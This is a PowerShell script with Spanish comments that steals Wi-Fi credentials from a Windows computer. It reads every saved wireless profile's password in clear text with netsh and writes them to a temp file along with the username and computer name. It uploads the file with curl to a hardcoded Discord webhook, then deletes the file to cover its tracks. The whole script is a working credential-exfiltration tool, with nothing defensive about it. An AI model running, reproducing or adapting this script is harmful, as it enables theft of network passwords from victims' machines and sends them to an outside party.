$webhookUrl = "https://discord.com/api/webhooks/1360605534838980780/BwDz68YsJ0nzDqi2eVFbZ6yWivXquWoUEIcc9hVBxBVLKiQnSGy8oDoccu2ctIy8HMtJ"
$tempFile = "$env:TEMP\$env:USERNAME-WiFi.txt"

# Encabezado mejorado
@"
=============================================
| Usuario: $env:USERNAME
| Equipo: $env:COMPUTERNAME
| Fecha: $(Get-Date -Format "dd/MM/yyyy HH:mm:ss")
=============================================

REDES CON CONTRASEÑA:
----------------------
SSID                       CONTRASEÑA
═══════════════════  ═══════════════════════
"@ | Out-File $tempFile -Encoding utf8

# Obtener perfiles WiFi
$perfiles = (netsh wlan show profiles) | Select-String "Perfil de todos los usuarios" | ForEach-Object {
    ($_ -split ":")[1].Trim()
}

$redesConPassword = @()
$redesSinPassword = @()

foreach ($red in $perfiles) {
    try {
        $infoRed = netsh wlan show profile name="$red" key=clear
        $pass = ($infoRed | Select-String "Contenido de la clave\s+:\s+(.+)").Matches.Groups[1].Value
        
        if ($pass) {
            $linea = "{0,-20} {1}" -f $red, $pass
            $redesConPassword += $linea
        } else {
            $redesSinPassword += $red
        }
    }
    catch {
        $redesSinPassword += $red
    }
}

# Escribir redes con contraseña
$redesConPassword | Out-File $tempFile -Append -Encoding utf8

# Añadir sección de redes abiertas/errores
@" 

REDES WIFI ABIERTAS:
----------------------------
"@ | Out-File $tempFile -Append -Encoding utf8

$redesSinPassword | ForEach-Object {
    "• $_" | Out-File $tempFile -Append -Encoding utf8
}

# Enviar usando curl
curl.exe -F "file1=@$tempFile" $webhookUrl

# Limpieza final
Remove-Item $tempFile -Force

# Cerrar PowerShell
exit 0
